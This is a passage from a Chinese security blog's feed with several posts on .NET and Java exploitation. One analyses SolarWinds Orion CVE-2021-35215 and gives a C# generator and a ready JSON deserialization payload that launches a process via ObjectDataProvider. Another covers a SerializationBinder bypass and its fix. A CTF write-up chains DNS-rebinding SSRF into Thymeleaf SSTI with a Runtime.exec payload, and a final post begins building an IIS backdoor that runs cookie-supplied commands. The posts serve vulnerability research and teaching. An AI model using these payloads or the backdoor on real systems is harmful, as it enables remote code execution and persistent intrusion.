    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://exp10it.io/2024/02/dotnet-insecure-serialization/#securityexception&quot;&gt;https://exp10it.io/2024/02/dotnet-insecure-serializ</summary>
      
    
    
    
    
    <category term="dotnet" scheme="https://ke1nys.github.io/tags/dotnet/"/>
    
  </entry>
  
  <entry>
    <title>SolarWinds-ActionPluginBaseView-反序列化(CVE-2021–35215)</title>
    <link href="https://ke1nys.github.io/posts/2945e9c.html"/>
    <id>https://ke1nys.github.io/posts/2945e9c.html</id>
    <published>2024-04-14T13:19:00.000Z</published>
    <updated>2024-04-18T12:57:04.536Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://exp10it.io/2024/02/solarwinds-orion-platform-actionpluginbaseview-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cve-202135215/">https://exp10it.io/2024/02/solarwinds-orion-platform-actionpluginbaseview-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cve-202135215/</a></p><p><a href="https://xz.aliyun.com/t/10412?time__1311=mq%2BxBDyDcDuWKGNDQi4%2B0Ybwe7whDGIix">https://xz.aliyun.com/t/10412?time__1311=mq%2BxBDyDcDuWKGNDQi4%2B0Ybwe7whDGIix</a></p><p><a href="https://testbnull.medium.com/50-shades-of-solarwinds-orion-deserialization-part-1-cve-2021-35215-2e5764e0e4f2">https://testbnull.medium.com/50-shades-of-solarwinds-orion-deserialization-part-1-cve-2021-35215-2e5764e0e4f2</a></p><p>这里的话就直接用他们图里的照片了  就不搭建环境了  因为有点麻烦 </p><p><strong>(看这个漏洞的时候可以先看看之前的Json.Net和JavaScriptSerializer  有助于这个漏洞的理解)</strong></p><p><img src="../images/image-20240415153336206.png" alt="image-20240415153336206"></p><p>我们从这开始吧   注意这个control的获取和传参  注意这两点对于我们下面的理解帮助很大</p><p><img src="../images/image-20240415153654537.png" alt="image-20240415153654537"></p><p>加载 control 对象后调用 ApplyPropertiesAndAttributes方法</p><p>获取 config 的内容, 然后传入 SetProperties</p><p><img src="../images/image-20240415153753112.png" alt="image-20240415153753112"></p><p>这里就是关键了   这个SetProperty函数就会调用我们传入的obj(就是control的setter方法)</p><p><img src="../images/image-20240415153918334.png" alt="image-20240415153918334"></p><p>仔细跟进这个setProperty方法的话  就会进入到这个SetValue方法中  然后就会在这个setMethod.Invoke调用</p><p>回到最初的地方仔细看  这个obj就是从我们传入的数据中获取的control类  所以这个类可控</p><p><img src="../images/image-20240415154307211.png" alt="image-20240415154307211"></p><p>那么就刚好对应上了作者说的这个东西</p><p>找一个可以利用setter进行RCE或写文件的control类</p><p><img src="../images/image-20240415154817562.png" alt="image-20240415154817562"></p><p>这个就是找到的一个可用的Control类 且setter方法可以进行利用</p><p><img src="../images/image-20240415154912028.png" alt="image-20240415154912028"></p><p>其setter方法</p><p><img src="../images/image-20240415154932599.png" alt="image-20240415154932599"></p><p>内部使用 Json.Net 的 JsonConvert.DeserializeObject 进行反序列化, 并且开启了 TypeNameHandling</p><p>并且他他要求的反序列化对象还得是<code>AlertingActionContext</code></p><p>这个对象就是ActionPluginBaseView这个control类的属性  可以控制  我们看看有没有object属性的参数可以利用</p><p>因为反序列化成对象的时候   就会触发我们object属性的恶意代码  其他属性不行</p><p><img src="../images/image-20240415155212969.png" alt="image-20240415155212969"></p><p>反正就是一直往下找  找到了这个属性  是字典的  并且存着object对象</p><p><img src="../images/image-20240415155346060.png" alt="image-20240415155346060"></p><p>这就解释完了 </p><p><img src="../images/image-20240415155414352.png" alt="image-20240415155414352"></p><p>最终POC</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> Newtonsoft.Json;</span><br><span class="line"><span class="keyword">using</span> SolarWinds.InformationService.Contract2;</span><br><span class="line"><span class="keyword">using</span> SolarWinds.Orion.Core.Models.Actions.Contexts;</span><br><span class="line"><span class="keyword">using</span> SolarWinds.Orion.Core.Models.MacroParsing;</span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Web.Script.Serialization;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">SolarWindsDemo</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">internal</span> <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            PropertyBag propertyBag = <span class="keyword">new</span> PropertyBag();</span><br><span class="line">            propertyBag.Add(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;&lt;ObjectDataProvider-payload&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">            SwisEntityContext swisEntityContext = <span class="keyword">new</span> SwisEntityContext();</span><br><span class="line">            swisEntityContext.EntityProperties = propertyBag;</span><br><span class="line"></span><br><span class="line">            MacroContext macroContext = <span class="keyword">new</span> MacroContext();</span><br><span class="line">            macroContext.Add(swisEntityContext);</span><br><span class="line"></span><br><span class="line">            AlertingActionContext alertingActionContext = <span class="keyword">new</span> AlertingActionContext();</span><br><span class="line">            alertingActionContext.MacroContext = macroContext;</span><br><span class="line"></span><br><span class="line">            JsonSerializerSettings settings = <span class="keyword">new</span> JsonSerializerSettings()</span><br><span class="line">            &#123;</span><br><span class="line">                TypeNameHandling = TypeNameHandling.Objects,</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">string</span> viewContextJsonString = JsonConvert.SerializeObject(alertingActionContext, settings);</span><br><span class="line">            Console.WriteLine(viewContextJsonString);</span><br><span class="line"></span><br><span class="line">            Dictionary&lt;<span class="built_in">string</span>, <span class="built_in">object</span>&gt; props = <span class="keyword">new</span> Dictionary&lt;<span class="built_in">string</span>, <span class="built_in">object</span>&gt;();</span><br><span class="line">            props.Add(<span class="string">&quot;EnviromentType&quot;</span>, <span class="string">&quot;Alerting&quot;</span>);</span><br><span class="line">            props.Add(<span class="string">&quot;ViewContextJsonString&quot;</span>, <span class="string">&quot;viewContextJsonString&quot;</span>);</span><br><span class="line"></span><br><span class="line">            Dictionary&lt;<span class="built_in">string</span>, <span class="built_in">object</span>&gt; dict = <span class="keyword">new</span> Dictionary&lt;<span class="built_in">string</span>, <span class="built_in">object</span>&gt;();</span><br><span class="line">            dict.Add(<span class="string">&quot;Control&quot;</span>, <span class="string">&quot;SolarWinds.Orion.Web.Actions.ActionPluginBaseView&quot;</span>);</span><br><span class="line">            dict.Add(<span class="string">&quot;config&quot;</span>, props);</span><br><span class="line"></span><br><span class="line">            JavaScriptSerializer javaScriptSerializer = <span class="keyword">new</span> JavaScriptSerializer();</span><br><span class="line">            <span class="built_in">string</span> data = javaScriptSerializer.Serialize(dict);</span><br><span class="line"></span><br><span class="line">            Console.WriteLine(data);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;Control&quot;</span><span class="punctuation">:</span> <span class="string">&quot;~/Orion/Actions/Controls/CustomPropertyView.ascx&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;config&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;EnviromentType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Alerting&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;ViewContextJsonString&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&#123;\&quot;$type\&quot;:\&quot;SolarWinds.Orion.Core.Models.Actions.Contexts.AlertingActionContext, SolarWinds.Orion.Actions.Models\&quot;,\&quot;ExecutionMode\&quot;:0,\&quot;EnviromentType\&quot;:0,\&quot;EntityType\&quot;:null,\&quot;EntityUri\&quot;:null,\&quot;EntityUris\&quot;:null,\&quot;IsGlobalAlert\&quot;:false,\&quot;AlertContext\&quot;:&#123;\&quot;$type\&quot;:\&quot;SolarWinds.Orion.Core.Models.Actions.Contexts.AlertContext, SolarWinds.Orion.Actions.Models\&quot;,\&quot;AlertName\&quot;:null,\&quot;CreatedBy\&quot;:null&#125;,\&quot;AlertActiveId\&quot;:null,\&quot;AlertObjectId\&quot;:null,\&quot;NetObjectData\&quot;:null,\&quot;ObjectDataExists\&quot;:false,\&quot;MacroContext\&quot;:&#123;\&quot;$type\&quot;:\&quot;SolarWinds.Orion.Core.Models.MacroParsing.MacroContext, SolarWinds.Orion.Core.Models.V1\&quot;,\&quot;contexts\&quot;:[&#123;\&quot;$type\&quot;:\&quot;SolarWinds.Orion.Core.Models.MacroParsing.SwisEntityContext, SolarWinds.Orion.Core.Models.V1\&quot;,\&quot;DisplayName\&quot;:\&quot;Net object properties\&quot;,\&quot;EntityType\&quot;:null,\&quot;EntityUri\&quot;:null,\&quot;EntityProperties\&quot;:&#123;\&quot;$type\&quot;:\&quot;SolarWinds.InformationService.Contract2.PropertyBag, SolarWinds.InformationService.Contract2\&quot;,\&quot;test\&quot;:&#123;\&quot;$type\&quot;:\&quot;System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\&quot;,\&quot;MethodName\&quot;:\&quot;Start\&quot;,\&quot;MethodParameters\&quot;:&#123;\&quot;$type\&quot;:\&quot;System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\&quot;,\&quot;$values\&quot;:[\&quot;cmd\&quot;,\&quot;/c calc.exe\&quot;]&#125;,\&quot;ObjectInstance\&quot;:&#123;\&quot;$type\&quot;:\&quot;System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\&quot;&#125;&#125;&#125;&#125;]&#125;&#125;&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>很有意思的一个洞</p><p><strong>SolarWinds Patch Manager WSAsyncExecuteTasks 反序列化 (CVE-2021–35217)</strong></p><p><strong><a href="https://exp10it.io/2024/02/solarwinds-patch-manager-wsasyncexecutetasks-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cve-202135217/">https://exp10it.io/2024/02/solarwinds-patch-manager-wsasyncexecutetasks-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cve-202135217/</a></strong> </p><p><strong>这个CVE其实也差不多</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://exp10it.io/2024/02/solarwinds-orion-platform-actionpluginbaseview-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cve-202135215/&quot;&gt;h</summary>
      
    
    
    
    
    <category term="dotnet" scheme="https://ke1nys.github.io/tags/dotnet/"/>
    
  </entry>
  
  <entry>
    <title>dotnet-SerializationBinder 绕过</title>
    <link href="https://ke1nys.github.io/posts/bc45ee55.html"/>
    <id>https://ke1nys.github.io/posts/bc45ee55.html</id>
    <published>2024-04-13T15:39:31.000Z</published>
    <updated>2024-04-18T12:57:04.538Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://y4er.com/posts/dotnet-deserialize-bypass-binder/#cve-2022-23277-of-exchange">https://y4er.com/posts/dotnet-deserialize-bypass-binder/#cve-2022-23277-of-exchange</a>  (Binder原理)</p><p><a href="https://exp10it.io/2024/02/dotnet-serializationbinder-%E7%BB%95%E8%BF%87/">https://exp10it.io/2024/02/dotnet-serializationbinder-%E7%BB%95%E8%BF%87/</a>   (Binder原理加绕过方法)</p><p>这两篇文章写的很好了  我就写一点点就行了</p><h1 id="SerializationBinder"><a href="#SerializationBinder" class="headerlink" title="SerializationBinder"></a>SerializationBinder</h1><p>我就来跟一下这个<code>SerializationBinder</code>吧  写一下流程  说明一下<code>Binder</code>使用不当造成绕过</p><p>Binder和java中的那个resovleclass过滤黑名单差不多  </p><p>.Net中是使用Binder来进行过滤的</p><p><strong>Demo</strong></p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters.Binary;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Serialize</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">internal</span> <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            BinaryFormatter binaryFormatter = <span class="keyword">new</span> BinaryFormatter();</span><br><span class="line">            MemoryStream memoryStream = <span class="keyword">new</span> MemoryStream();</span><br><span class="line">            RCE calc = <span class="keyword">new</span> RCE(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">            binaryFormatter.Serialize(memoryStream, calc);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            memoryStream.Position = <span class="number">0</span>;</span><br><span class="line">            binaryFormatter.Binder = <span class="keyword">new</span> MyBinder();</span><br><span class="line">            <span class="built_in">object</span> v = binaryFormatter.Deserialize(memoryStream);</span><br><span class="line">            Console.WriteLine(v);</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">Serializable</span>]</span><br><span class="line">    <span class="keyword">class</span> <span class="title">RCE</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> cmd;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">RCE</span>(<span class="params"><span class="built_in">string</span> cmd</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">this</span>.cmd = cmd;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="built_in">string</span> <span class="title">ToString</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">$&quot;exec cmd:<span class="subst">&#123;cmd&#125;</span>&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">MyBinder</span> : <span class="title">SerializationBinder</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> Type <span class="title">BindToType</span>(<span class="params"><span class="built_in">string</span> assemblyName, <span class="built_in">string</span> typeName</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">$&quot;assemblyName:<span class="subst">&#123;assemblyName&#125;</span>,typeName:<span class="subst">&#123;typeName&#125;</span>.&quot;</span>);</span><br><span class="line">            Type typeToDeserialize = Type.GetType(String.Format(<span class="string">&quot;&#123;0&#125;, &#123;1&#125;&quot;</span>, typeName, assemblyName));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (typeToDeserialize.Equals(<span class="keyword">typeof</span>(RCE)))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//throw new Exception(&quot;can&#x27;t deseriliza rce class.&quot;);</span></span><br><span class="line">                Console.WriteLine(<span class="string">&quot;can&#x27;t deseriliza rce class.&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> typeToDeserialize;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20240414170206206.png" alt="image-20240414170206206"></p><p>自己定义一个可以进行反序列化的类</p><p><img src="../images/image-20240414170242423.png" alt="image-20240414170242423"></p><p>自己写个Binder来进行定义 如果匹配到RCE这个类就禁止进行反序列化操作 </p><p><strong>(简单点说  如果能让<code>BindToType</code>这个类返回我们序列化的类的话   就能进行反序列化操作)</strong></p><p><img src="../images/image-20240414170345077.png" alt="image-20240414170345077"></p><p>序列化和反序列化操作</p><p><img src="../images/image-20240414170632975.png" alt="image-20240414170632975"></p><p>这里就是有个奇怪的点了  就是我们明明在BindToType这个的函数的时候  匹配到了RCE这个类  return null了  为什么还能进行反序列化操作  我们给BindToType这个函数下个断点来进行分析</p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p><img src="../images/image-20240414171101772.png" alt="image-20240414171101772"></p><p>因为这里呢  在刚开始的时候 匹配到了我们的RCE类 然后return null了  那么type的值就是null了  所以进行到下面的if判断中  进入到FastBindToType中</p><p><img src="../images/image-20240414171406086.png" alt="image-20240414171406086"></p><p>先根据TypeName中缓存中获取assemblyName  这里是没获取到 接着往下看</p><p><img src="../images/image-20240414171630245.png" alt="image-20240414171630245"></p><p><img src="../images/image-20240414171614670.png" alt="image-20240414171614670"></p><p>这里的bSimple默认值为true </p><p><img src="../images/image-20240414171740943.png" alt="image-20240414171740943"></p><p>最后通过这里拿到了我们的assemblyName了  第一个从缓存中没拿到  然后第二次在这拿到了</p><p><img src="../images/image-20240414171953627.png" alt="image-20240414171953627"></p><p>最后呢 在断点处拿到了这个type值  然后赋值给typeNassembly.type  最后return返回  那么我们的BindToType函数还是回去到我们最终想要回去到Type值  所以就能反序列化成功  这样的话就没有受限于这个Binder的限制 </p><p>修复方法就是在匹配的时候直接抛出异常  不返回null</p><h1 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h1><p><img src="../images/image-20240414172245670.png" alt="image-20240414172245670"></p><p>这样子的话就能成功过滤黑名单  不会被绕过</p><p>其他绕过方法的话就看xz写的那个文章了  这里就不写了</p><p><a href="https://exp10it.io/2024/02/dotnet-serializationbinder-%E7%BB%95%E8%BF%87/">https://exp10it.io/2024/02/dotnet-serializationbinder-%E7%BB%95%E8%BF%87/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://y4er.com/posts/dotnet-deserialize-bypass-binder/#cve-2022-23277-of-exchange&quot;&gt;https://y4er.com/posts/dotnet-deserialize-b</summary>
      
    
    
    
    
    <category term="dotnet" scheme="https://ke1nys.github.io/tags/dotnet/"/>
    
  </entry>
  
  <entry>
    <title>2024红名谷-Java</title>
    <link href="https://ke1nys.github.io/posts/cb384e29.html"/>
    <id>https://ke1nys.github.io/posts/cb384e29.html</id>
    <published>2024-04-10T08:37:48.000Z</published>
    <updated>2024-04-18T12:57:04.525Z</updated>
    
    <content type="html"><![CDATA[<p><img src="../images/image-20240410191230916.png" alt="image-20240410191230916"></p><p>并不是打什么反序列化链子的操作  就是一个打<code>SSRF 302跳转/Dns重绑定</code>  然后ssti的一个操作</p><p><img src="../images/image-20240410193629155.png" alt="image-20240410193629155"></p><p>模板渲染的点  这里值如果可控的话就可以造成SSTI漏洞</p><p><img src="../images/image-20240410193809139.png" alt="image-20240410193809139"></p><p>刚在再AdminControl里面有个Process函数  并且这hostname可控 我们本地进行测试</p><p>写了个demo</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">package com.example;</span><br><span class="line"></span><br><span class="line">import org.thymeleaf.TemplateEngine;</span><br><span class="line">import org.thymeleaf.context.Context;</span><br><span class="line">import org.thymeleaf.spring5.SpringTemplateEngine;</span><br><span class="line"></span><br><span class="line">public class Test &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        String hostname = &quot;&lt;a th:href=\&quot;$&#123;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&#125;\&quot; th:title=&#x27;pepito&#x27;&gt;&quot;;</span><br><span class="line">        Context context = new Context();</span><br><span class="line">        TemplateEngine engine = new SpringTemplateEngine();</span><br><span class="line">        String dispaly = engine.process(hostname, context);</span><br><span class="line">        System.out.println(dispaly);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240410193920938.png" alt="image-20240410193920938"></p><p>能成功执行  那么说明了 只要我们传入我们恶意构造的hotsname参数 然后访问<code>getsites</code>路由 就能成功进入到这个模板渲染这了  </p><p><img src="../images/image-20240412201220592.png" alt="image-20240412201220592"></p><p><img src="../images/image-20240412201237283.png" alt="image-20240412201237283"></p><p>其实看到这的话  对DNS重绑定有印象的话 应该就能想到这用dns重绑定来打了  </p><p>看Curl这个路由发现</p><p><img src="../images/image-20240412201541908.png" alt="image-20240412201541908"></p><p><img src="../images/image-20240412201601591.png" alt="image-20240412201601591"></p><p>只要ip满足上述的这些if判断   就能进入到下面的<code>connect()</code>方法中  并且由于ttl为0  那么dns解释缓存的时间就为0  那么在第二次解析的时候  就会指向<code>127.0.0.1</code>  从而进入到<code>getsites</code>路由中</p><p><img src="../images/image-20240412201854270.png" alt="image-20240412201854270"></p><p>并且hoatname的值可控  然后302调转到<code>http://127.0.0.1/?hostname=exp</code>就行了</p><p>以后看到限制ip127.0.0.1的题目  可以考虑一下SSRF</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;../images/image-20240410191230916.png&quot; alt=&quot;image-20240410191230916&quot;&gt;&lt;/p&gt;
&lt;p&gt;并不是打什么反序列化链子的操作  就是一个打&lt;code&gt;SSRF 302跳转/Dns重绑定&lt;/cod</summary>
      
    
    
    
    
    <category term="Java" scheme="https://ke1nys.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Dotnet-IIS后门</title>
    <link href="https://ke1nys.github.io/posts/cfd4005e.html"/>
    <id>https://ke1nys.github.io/posts/cfd4005e.html</id>
    <published>2024-04-04T07:35:07.000Z</published>
    <updated>2024-04-18T12:57:04.534Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://y4er.com/posts/using-csharp-to-develop-the-iis-module-backdoor/#%E5%8F%82%E8%80%83">https://y4er.com/posts/using-csharp-to-develop-the-iis-module-backdoor/#%E5%8F%82%E8%80%83</a></p><p><a href="https://github.com/WBGlIl/IIS_backdoor/tree/master">https://github.com/WBGlIl/IIS_backdoor/tree/master</a></p><h2 id="iis后门的两种形式"><a href="#iis后门的两种形式" class="headerlink" title="iis后门的两种形式"></a>iis后门的两种形式</h2><p><a href="https://docs.microsoft.com/en-us/iis/develop/runtime-extensibility/developing-iis-modules-and-handlers-with-the-net-framework#two-ways-to-extend-iis-module-vs-handler">根据微软的文档</a>，iis开发功能分为两种，分别是<code>IIS module</code>和<code>IIS handler</code>，即IIS模块和IIS处理程序。</p><p>IIS模块是一个.NET类，该类实现ASP.NET<code>System.Web.IHttpModule</code>接口，并使用<code>System.Web</code>命名空间中的API参与一个或多个ASP.NET的请求处理阶段。</p><p>IIS处理程序也是一个类，该类实现ASP.NET<code>System.Web.IHttpHandler</code>或<code>System.Web.IHttpAsyncHandler</code>接口，并使用<code>System.Web</code>命名空间中的API为其支持的特定内容生成http响应。</p><p>IIS处理程序负责将请求提供给特定的url或特定扩展名，IIS模块则应用于基于任意规则的所有或某些请求。本文以IIS模块为例开发IIS后门实现从Cookie中获取cmd命令并执行。</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>这里我用的是<code>Rider</code>和<code>.Net4.8.1</code>   项目的话直接用<code>ASP.NET Web</code>就行了  </p><p><img src="../images/image-20240404154346922.png" alt="image-20240404154346922"></p><p>环境这样起就算成功了</p><p><img src="../images/image-20240404154420580.png" alt="image-20240404154420580"></p><p>默认是加载这个Default.aspx</p><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">IIS_BackDoor</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">MyModule</span> : <span class="title">IHttpModule</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Dispose</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NotImplementedException();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Init</span>(<span class="params">HttpApplication context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NotImplementedException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>两个接口分别负责模块的两个生命周期</p><ol><li>Init 模块初始化</li><li>Dispose 请求销毁</li></ol><p>Init()方法接受一个HttpApplication参数，此参数代表请求的上下文。其中HttpApplication中有一个订阅事件PreRequestHandlerExecute，<strong>该事件字面意思就是在请求之前进行处理。</strong></p><p><img src="../images/image-20240404155604801.png" alt="image-20240404155604801"></p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span 